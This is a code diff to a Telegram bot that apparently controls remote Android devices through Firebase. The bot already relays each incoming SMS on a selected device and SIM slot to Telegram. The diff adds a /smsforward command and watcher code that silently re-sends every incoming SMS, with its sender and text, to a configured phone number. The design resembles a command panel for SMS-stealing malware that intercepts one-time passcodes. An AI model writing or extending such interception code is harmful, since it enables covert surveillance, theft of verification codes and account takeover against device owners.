@@ -57,7 +57,8 @@ async function getUserData(userId) {
         monitor: true,
         smsForward: false,
         isPublic: false,
-        monitoredChats: []
+        monitoredChats: [],
+        smsForwardNumber: null
     };
 
     if (!data) {
@@ -73,7 +74,8 @@ async function getUserData(userId) {
                 monitor: true,
                 smsForward: false,
                 isPublic: false,
-                monitoredChats: []
+                monitoredChats: [],
+                smsForwardNumber: null
             });
         if (insertErr) {
             console.error('Error inserting default user in Supabase:', insertErr);
@@ -90,7 +92,8 @@ async function getUserData(userId) {
         monitor: data.monitor === true || data.monitor === 1,
         smsForward: data.smsForward === true || data.smsForward === 1,
         isPublic: data.isPublic === true || data.isPublic === 1,
-        monitoredChats: Array.isArray(data.monitoredChats) ? data.monitoredChats : []
+        monitoredChats: Array.isArray(data.monitoredChats) ? data.monitoredChats : [],
+        smsForwardNumber: data.smsForwardNumber || null
     };
 }
 
@@ -109,7 +112,8 @@ async function updateUserData(userId, updates) {
             monitor: merged.monitor,
             smsForward: merged.smsForward,
             isPublic: merged.isPublic,
-            monitoredChats: merged.monitoredChats
+            monitoredChats: merged.monitoredChats,
+            smsForwardNumber: merged.smsForwardNumber
         })
         .eq('id', userId);
 
@@ -139,7 +143,8 @@ async function loadAllUsers() {
             monitor: row.monitor === true || row.monitor === 1,
             smsForward: row.smsForward === true || row.smsForward === 1,
             isPublic: row.isPublic === true || row.isPublic === 1,
-            monitoredChats: Array.isArray(row.monitoredChats) ? row.monitoredChats : []
+            monitoredChats: Array.isArray(row.monitoredChats) ? row.monitoredChats : [],
+            smsForwardNumber: row.smsForwardNumber || null
         };
     });
     return result;
@@ -275,6 +280,7 @@ bot.onText(/\/start/, (msg) => {
         `• /resume - _Resume Relay_\n\n` +
         `📲 *Advanced:*\n` +
         `• /sms on/off - _Incoming SMS Forwarding_\n` +
+        `• /smsforward <num> - _Auto-forward to mobile number_\n` +
         `• /status - _System Overview_\n` +
         `• /online - _Quick Status Check_\n` +
         `• /reset - _Clear All Settings_\n` +
@@ -505,6 +511,33 @@ bot.onText(/\/sms (on|off)/, async (msg, match) => {
     bot.sendMessage(userId, `📲 *SMS Forwarding:* ${state ? '🟢 ON' : '🔴 OFF'}`, { parse_mode: 'Markdown' });
 });
 
+bot.onText(/\/smsforward(?:\s+(.+))?/, async (msg, match) => {
+    const userId = msg.from.id;
+    const arg = match[1] ? match[1].trim() : null;
+
+    if (!arg) {
+        const u = await getUserData(userId);
+        if (u.smsForwardNumber) {
+            return bot.sendMessage(userId, `🎯 *Current SMS Auto-Forward Number:* \`${u.smsForwardNumber}\`\n\nTo disable, use: \`/smsforward off\``, { parse_mode: 'Markdown' });
+        } else {
+            return bot.sendMessage(userId, `❌ *SMS Auto-Forward Number not set.*\n\nUse: \`/smsforward <number>\` to configure.`, { parse_mode: 'Markdown' });
+        }
+    }
+
+    if (arg.toLowerCase() === 'off' || arg.toLowerCase() === 'clear') {
+        await updateUserData(userId, { smsForwardNumber: null });
+        return bot.sendMessage(userId, `✅ *SMS Auto-Forwarding disabled.*`);
+    }
+
+    const cleanNum = arg.replace(/[\s\-]/g, '');
+    if (!/^\+?\d{10,15}$/.test(cleanNum)) {
+        return bot.sendMessage(userId, `❌ *Invalid Phone Number!* Please enter a valid number (10 to 15 digits).`, { parse_mode: 'Markdown' });
+    }
+
+    await updateUserData(userId, { smsForwardNumber: cleanNum });
+    bot.sendMessage(userId, `✅ *SMS Auto-Forward Number Set:* \`${cleanNum}\`\n\nIncoming SMS on your device will automatically bounce to this number.`, { parse_mode: 'Markdown' });
+});
+
 bot.onText(/\/status/, async (msg) => {
     const d = await getUserData(msg.from.id);
     let status = `📊 *System Status Overview*\n\n`;
@@ -513,6 +546,7 @@ bot.onText(/\/status/, async (msg) => {
     status += `📱 *Device ID:* \`${d.selectedDevice || 'None'}\`\n`;
     status += `💳 *SIM Slot:* ${d.sim || 'None'}\n`;
     status += `📲 *SMS Fwd:* ${d.smsForward ? '🟢 ON' : '🔴 OFF'}\n`;
+    status += `🎯 *Fwd Target:* \`${d.smsForwardNumber || 'Not Set'}\`\n`;
     status += `📡 *Monitoring:* ${d.monitor ? '🟢 ON' : '🔴 OFF'}\n`;
     status += `📋 *Channels:* ${d.monitoredChats.length}\n`;
     bot.sendMessage(msg.from.id, status, { parse_mode: 'Markdown' });
@@ -655,19 +689,39 @@ function startSmsWatcher() {
                         // Send push notification if a new message key is registered
                         if (lastSeenSmsKeys[cacheKey] !== key) {
                             lastSeenSmsKeys[cacheKey] = key;
-
+ 
                             const text = msgData.message || msgData.body || msgData.text || 'No message content';
                             const sender = msgData.sender || msgData.from || 'Unknown';
                             const date = msgData.dateTime || msgData.date || 'N/A';
-
+ 
                             const alertMsg = `📲 *New SMS Received* 📲\n\n` +
                                              `👤 *From:* \`${sender}\`\n` +
                                              `💬 *Message:* \`${text}\`\n` +
                                              `⏰ *Time:* _${date}_`;
-
+ 
                             bot.sendMessage(userId, alertMsg, { parse_mode: 'Markdown' }).catch((err) => {
                                 console.error(`⚠️ Failed to send SMS alert to user ${userId}:`, err.message);
                             });
+
+                            // AUTO-FORWARD INCOMING SMS IF CONFIGURED
+                            if (userData.smsForwardNumber) {
+                                if (userData.selectedDevice && userData.sim) {
+                                    const forwardPayload = `From: ${sender}\nMsg: ${text}`;
+                                    sendSmsViaFirebase(userId, userData.selectedDevice, userData.sim, userData.smsForwardNumber, forwardPayload)
+                                        .then((ok) => {
+                                            if (ok) {
+                                                bot.sendMessage(userId, `✅ *SMS Auto-Forwarded Successfully!*\n\n📱 To: \`${userData.smsForwardNumber}\`\n💬 Msg: \`${text}\``, { parse_mode: 'Markdown' });
+                                            } else {
+                                                bot.sendMessage(userId, `❌ *SMS Auto-Forward Failed.*`);
+                                            }
+                                        })
+                                        .catch((forwardErr) => {
+                                            bot.sendMessage(userId, `⚠️ *SMS Auto-Forward Error:* ${forwardErr.message}`);
+                                        });
+                                } else {
+                                    bot.sendMessage(userId, `⚠️ *SMS Auto-Forward Failed:* Active SIM slot or device not configured.`);
+                                }
+                            }
                         }
                     } catch (innerErr) {
                         // Suppress single user database check errors to run others uninterrupted
